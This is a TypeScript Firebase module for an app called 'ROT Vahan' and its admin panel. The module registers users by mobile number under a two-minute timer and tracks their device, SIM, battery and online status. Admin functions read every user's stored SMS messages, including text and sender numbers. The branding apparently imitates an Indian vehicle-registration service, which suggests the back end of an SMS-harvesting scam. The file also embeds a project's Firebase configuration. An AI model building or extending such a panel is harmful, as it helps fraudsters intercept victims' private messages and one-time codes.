import { initializeApp } from 'firebase/app';
import {
  EmailAuthProvider,
  getAuth,
  GoogleAuthProvider,
  onAuthStateChanged,
  reauthenticateWithCredential,
  signInAnonymously,
  signInWithEmailAndPassword,
  signInWithPopup,
  signOut,
  updatePassword,
  type User,
} from 'firebase/auth';
import {
  get,
  getDatabase,
  onDisconnect,
  onValue,
  ref,
  serverTimestamp,
  set,
  update,
  type Unsubscribe,
} from 'firebase/database';

export const firebaseConfig = {
  apiKey: 'AIzaSyBRlctNhFKcOy1e-Qhvwd6d00FAWCuxnh8',
  authDomain: 'sk-admin-panel-886ef.firebaseapp.com',
  databaseURL: 'https://sk-admin-panel-886ef-default-rtdb.firebaseio.com',
  projectId: 'sk-admin-panel-886ef',
  storageBucket: 'sk-admin-panel-886ef.firebasestorage.app',
  messagingSenderId: '2742180458',
  appId: '1:2742180458:web:7f0b8254e0ea109dc60813',
  measurementId: 'G-ZQ9NK5J74C',
};

export const TIMER_DURATION_MS = 120_000;

const app = initializeApp(firebaseConfig);
export const auth = getAuth(app);
export const rtdb = getDatabase(app, firebaseConfig.databaseURL);

export type TimerStatus = 'active' | 'expired';
export type ConnectionStatus = 'online' | 'offline';
export type SmsPermissionDisplay = 'Granted' | 'Permission Denied' | 'Not Available';
export type NotificationPermissionDisplay =
  | 'Granted'
  | 'Permission Denied'
  | 'Not Available'
  | 'Not Requested';

export interface RotVahanUser {
  ownerUid: string | null;
  appName?: string;
  userName: string;
  name?: string;
  mobileNumber: string;
  phone?: string;
  registrationTime: number;
  registrationTimeFormatted?: string;
  timerStartTime: number;
  timerExpiryTime: number;
  timerStatus: TimerStatus;
  connectionStatus?: ConnectionStatus;
  isOnline?: boolean;
  online?: boolean;
  networkAvailable?: boolean;
  lastSeen?: number;
  smsPermissionStatus?: SmsPermissionDisplay;
  notificationPermissionStatus?: NotificationPermissionDisplay;
  smsAlertEnabled?: boolean;
  simNumber?: string;
  simPermissionStatus?: 'Granted' | 'Permission Denied' | 'Not Available' | 'Not Requested';
  sim1Details?: string;
  sim2Details?: string;
  deviceModel?: string;
  mobileModel?: string;
  networkOperator?: string;
  batteryPercentage?: string;
  deviceDateTime?: string;
}

export interface SmsAlertRecord {
  id: string;
  ownerUid: string;
  mobileNumber: string;
  alertMessage: string;
  senderNumber: string;
  receivedAt: number;
  receivedAtFormatted?: string;
  status: 'New' | 'Seen';
}

export function formatReadableDateTime(epochMs: number | null | undefined): string {
  if (!epochMs) return '—';
  return new Date(epochMs).toLocaleString('en-IN', {
    day: '2-digit',
    month: 'short',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  });
}

export function getBrowserNotificationStatus(): NotificationPermissionDisplay {
  if (typeof window === 'undefined' || !('Notification' in window)) {
    return 'Not Available';
  }
  if (Notification.permission === 'granted') return 'Granted';
  if (Notification.permission === 'denied') return 'Permission Denied';
  return 'Not Requested';
}

export async function ensureAuthSession(): Promise<string | null> {
  if (auth.currentUser) return auth.currentUser.uid;
  try {
    const cred = await signInAnonymously(auth);
    return cred.user.uid;
  } catch {
    return null;
  }
}

export async function signInAdminWithEmail(email: string, password: string): Promise<User> {
  const cred = await signInWithEmailAndPassword(auth, email.trim(), password);
  return cred.user;
}

export async function signInAdminWithGoogle(): Promise<User> {
  const provider = new GoogleAuthProvider();
  const cred = await signInWithPopup(auth, provider);
  return cred.user;
}

export async function signOutAdmin(): Promise<void> {
  await signOut(auth);
}

export async function changeAdminPassword(
  currentPassword: string,
  newPassword: string,
): Promise<void> {
  const user = auth.currentUser;
  if (!user || !user.email) {
    throw new Error('Password update is available for email/password admin accounts.');
  }
  const credential = EmailAuthProvider.credential(user.email, currentPassword);
  await reauthenticateWithCredential(user, credential);
  await updatePassword(user, newPassword);
}

export function subscribeToAuth(callback: (user: User | null) => void): Unsubscribe {
  return onAuthStateChanged(auth, callback);
}

export async function checkIsAdmin(uid: string): Promise<boolean> {
  try {
    const snap = await get(ref(rtdb, `admins/${uid}`));
    return snap.exists() && snap.val() === true;
  } catch {
    return false;
  }
}

export function subscribeToServerTimeOffset(onOffset: (offsetMs: number) => void): Unsubscribe {
  const offsetRef = ref(rtdb, '.info/serverTimeOffset');
  return onValue(offsetRef, (snap) => {
    const val = snap.val();
    if (typeof val === 'number' && Number.isFinite(val)) {
      onOffset(val);
    }
  });
}

/**
 * Combines Firebase RTDB `.info/connected` + `onDisconnect()` with browser
 * `navigator.onLine` network listeners for automatic Online/Offline detection.
 */
export function subscribeToConnectionPresence(
  activeMobile: string | null,
  onConnectedChange: (connected: boolean) => void,
): Unsubscribe {
  let rtdbConnected = false;
  let browserOnline = typeof navigator !== 'undefined' ? navigator.onLine : true;

  const syncState = async () => {
    const effectiveOnline = rtdbConnected && browserOnline;
    onConnectedChange(effectiveOnline);

    if (!rtdbConnected || !activeMobile) {
      return;
    }

    const userRef = ref(rtdb, `users/${activeMobile}`);
    try {
      const existingSnap = await get(userRef);
      if (!existingSnap.exists()) return;

      await onDisconnect(userRef).update({
        connectionStatus: 'offline',
        isOnline: false,
        online: false,
        networkAvailable: false,
        lastSeen: serverTimestamp(),
      });

      await update(userRef, {
        connectionStatus: effectiveOnline ? 'online' : 'offline',
        isOnline: effectiveOnline,
        online: effectiveOnline,
        networkAvailable: browserOnline,
        lastSeen: serverTimestamp(),
      });
    } catch {
      // Ignore if rules prevent write
    }
  };

  const handleOnline = () => {
    browserOnline = true;
    void syncState();
  };
  const handleOffline = () => {
    browserOnline = false;
    void syncState();
  };

  if (typeof window !== 'undefined') {
    window.addEventListener('online', handleOnline);
    window.addEventListener('offline', handleOffline);
  }

  const connectedRef = ref(rtdb, '.info/connected');
  const unsubConnected = onValue(connectedRef, (snap) => {
    rtdbConnected = snap.val() === true;
    void syncState();
  });

  return () => {
    unsubConnected();
    if (typeof window !== 'undefined') {
      window.removeEventListener('online', handleOnline);
      window.removeEventListener('offline', handleOffline);
    }
  };
}

export async function setUserOffline(mobile: string): Promise<void> {
  const userRef = ref(rtdb, `users/${mobile}`);
  try {
    await onDisconnect(userRef).cancel();
    await update(userRef, {
      connectionStatus: 'offline',
      isOnline: false,
      online: false,
      lastSeen: serverTimestamp(),
    });
  } catch {
    // Ignore cleanup errors
  }
}

export async function updateNotificationPermissionInDb(
  mobile: string,
  status: NotificationPermissionDisplay,
): Promise<void> {
  const userRef = ref(rtdb, `users/${mobile}`);
  await update(userRef, {
    notificationPermissionStatus: status,
  });
}

async function fetchTrustedServerTimeMs(fallbackOffsetMs: number): Promise<number> {
  try {
    const res = await fetch('/api/server-time');
    if (res.ok) {
      const data = (await res.json()) as { serverTimeMs?: number };
      if (typeof data.serverTimeMs === 'number' && Number.isFinite(data.serverTimeMs)) {
        return data.serverTimeMs;
      }
    }
  } catch {
    // Fall back to Firebase serverTimeOffset
  }
  return Date.now() + fallbackOffsetMs;
}

export async function registerUserAndStartTimer(params: {
  name: string;
  mobile: string;
  serverTimeOffsetMs: number;
  notificationPermissionStatus: NotificationPermissionDisplay;
}): Promise<RotVahanUser> {
  const uid = await ensureAuthSession();
  const cleanName = params.name.trim();
  const cleanMobile = params.mobile.replace(/\D/g, '');
  const userRef = ref(rtdb, `users/${cleanMobile}`);

  const existingSnap = await get(userRef);
  const trustedNow = await fetchTrustedServerTimeMs(params.serverTimeOffsetMs);
  const browserOnline = typeof navigator !== 'undefined' ? navigator.onLine : true;

  if (existingSnap.exists()) {
    const existing = existingSnap.val() as RotVahanUser;
    if (existing.timerExpiryTime && existing.timerExpiryTime > trustedNow) {
      await onDisconnect(userRef).update({
        connectionStatus: 'offline',
        isOnline: false,
        online: false,
        networkAvailable: false,
        lastSeen: serverTimestamp(),
      });
      await update(userRef, {
        userName: cleanName,
        name: cleanName,
        phone: cleanMobile,
        connectionStatus: browserOnline ? 'online' : 'offline',
        isOnline: browserOnline,
        online: browserOnline,
        networkAvailable: browserOnline,
        notificationPermissionStatus: params.notificationPermissionStatus,
        smsPermissionStatus: 'Not Available',
        lastSeen: serverTimestamp(),
      });
      const refreshed = await get(userRef);
      return refreshed.val() as RotVahanUser;
    }
  }

  await set(userRef, {
    ownerUid: uid,
    appName: 'ROT Vahan',
    userName: cleanName,
    name: cleanName,
    mobileNumber: cleanMobile,
    phone: cleanMobile,
    registrationTime: serverTimestamp(),
    timerStartTime: serverTimestamp(),
    timerExpiryTime: trustedNow + TIMER_DURATION_MS,
    timerStatus: 'active',
    connectionStatus: browserOnline ? 'online' : 'offline',
    isOnline: browserOnline,
    online: browserOnline,
    networkAvailable: browserOnline,
    lastSeen: serverTimestamp(),
    notificationPermissionStatus: params.notificationPermissionStatus,
    smsPermissionStatus: 'Not Available',
    simNumber: 'Not Available',
    simPermissionStatus: 'Not Available',
    deviceModel: 'Web Browser',
    mobileModel: 'Web Browser',
  });

  await onDisconnect(userRef).update({
    connectionStatus: 'offline',
    isOnline: false,
    online: false,
    networkAvailable: false,
    lastSeen: serverTimestamp(),
  });

  const savedSnap = await get(userRef);
  const saved = savedSnap.val() as RotVahanUser;
  const authoritativeStart = saved.timerStartTime || trustedNow;
  const authoritativeReg = saved.registrationTime || authoritativeStart;
  const authoritativeExpiry = authoritativeStart + TIMER_DURATION_MS;

  await update(userRef, {
    registrationTimeFormatted: formatReadableDateTime(authoritativeReg),
    timerExpiryTime: authoritativeExpiry,
  });

  const finalSnap = await get(userRef);
  return finalSnap.val() as RotVahanUser;
}

export async function markTimerExpired(mobile: string): Promise<void> {
  const userRef = ref(rtdb, `users/${mobile}`);
  await update(userRef, {
    timerStatus: 'expired',
  });
}

export function subscribeToUser(
  mobile: string,
  onData: (user: RotVahanUser | null) => void,
  onError: (err: Error) => void,
): Unsubscribe {
  const userRef = ref(rtdb, `users/${mobile}`);
  return onValue(
    userRef,
    (snap) => {
      onData(snap.exists() ? (snap.val() as RotVahanUser) : null);
    },
    (err) => onError(err),
  );
}

export function subscribeToAllUsers(
  onData: (users: RotVahanUser[]) => void,
  onError: (err: Error) => void,
): Unsubscribe {
  const usersRef = ref(rtdb, 'users');
  return onValue(
    usersRef,
    (snap) => {
      if (!snap.exists()) {
        onData([]);
        return;
      }
      const raw = snap.val() as Record<string, RotVahanUser>;
      const list = Object.entries(raw).map(([key, val]) => ({
        ...val,
        mobileNumber: val.mobileNumber || val.phone || key,
        userName: val.userName || val.name || 'User',
      }));
      list.sort((a, b) => (b.registrationTime || 0) - (a.registrationTime || 0));
      onData(list);
    },
    (err) => onError(err),
  );
}

export async function setSmsAlertEnabledInDb(mobile: string, enabled: boolean): Promise<void> {
  await update(ref(rtdb, `users/${mobile}`), {
    smsAlertEnabled: enabled,
  });
}

export async function markSmsAlertSeenInDb(mobile: string, alertId: string): Promise<void> {
  await update(ref(rtdb, `sms_alerts/${mobile}/${alertId}`), {
    status: 'Seen',
  });
}

export function subscribeToUserSmsAlerts(
  mobile: string,
  onData: (alerts: SmsAlertRecord[]) => void,
): Unsubscribe {
  const alertsRef = ref(rtdb, `sms_alerts/${mobile}`);
  return onValue(alertsRef, (snap) => {
    if (!snap.exists()) {
      onData([]);
      return;
    }
    const raw = snap.val() as Record<string, Omit<SmsAlertRecord, 'id'>>;
    const list: SmsAlertRecord[] = Object.entries(raw).map(([id, val]) => ({
      ...val,
      id,
      mobileNumber: val.mobileNumber || mobile,
    }));
    list.sort((a, b) => (b.receivedAt || 0) - (a.receivedAt || 0));
    onData(list);
  });
}

export function subscribeToAllSmsAlerts(
  onData: (alerts: SmsAlertRecord[]) => void,
): Unsubscribe {
  const alertsRef = ref(rtdb, 'sms_alerts');
  return onValue(alertsRef, (snap) => {
    if (!snap.exists()) {
      onData([]);
      return;
    }
    const raw = snap.val() as Record<string, Record<string, Omit<SmsAlertRecord, 'id'>>>;
    const list: SmsAlertRecord[] = [];
    for (const [mobile, group] of Object.entries(raw)) {
      if (!group) continue;
      for (const [id, val] of Object.entries(group)) {
        list.push({
          ...val,
          id,
          mobileNumber: val.mobileNumber || mobile,
        });
      }
    }
    list.sort((a, b) => (b.receivedAt || 0) - (a.receivedAt || 0));
    onData(list);
  });
}
